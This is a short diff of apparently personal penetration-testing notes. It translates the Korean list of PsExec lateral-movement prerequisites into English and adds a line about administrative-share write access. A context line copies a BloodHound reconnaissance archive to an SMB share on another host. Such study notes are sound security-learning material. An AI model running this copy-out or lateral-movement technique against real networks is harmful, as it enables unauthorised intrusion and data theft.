@@ -378,10 +378,11 @@ copy 20250907215911_BloodHound.zip \\192.168.45.171\share\
 
 ## PsExec
 
-### 전제 조건
-- 타겟 호스트의 Local Administrator 권한을 갖고 있는 계정/비밀번호
-- 타겟 호스트가 SMB 서비스를 사용하고 있으며 방화벽으로 막아놓지 않는 경우
-- File and Print Sharing 활성화, Simple File Sharing 비활성화 (디폴트)
+### Prerequisites
+- Valid account credentials with Local Administrator privileges on the target host
+- SMB service must be accessible on the target host and not blocked by a firewall
+- File and Printer Sharing enabled and Simple File Sharing disabled (default)
+- ADMIN$ or C$ administrative shares with read and write permissions
 
 [https://www.xn--hy1b43d247a.com/lateral-movement/smb-psexec](https://www.xn--hy1b43d247a.com/lateral-movement/smb-psexec)
 
